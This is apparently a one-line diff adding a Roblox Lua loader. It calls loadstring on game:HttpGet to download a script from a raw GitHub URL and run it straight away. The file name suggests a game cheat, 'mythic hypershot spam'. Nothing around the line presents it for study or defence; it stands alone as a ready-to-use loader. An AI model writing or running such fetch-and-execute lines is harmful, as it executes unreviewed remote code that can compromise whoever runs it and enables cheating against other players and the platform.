@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/new-mythic-hypershot-spam0-03w0b22ffiy4se.lua"))()
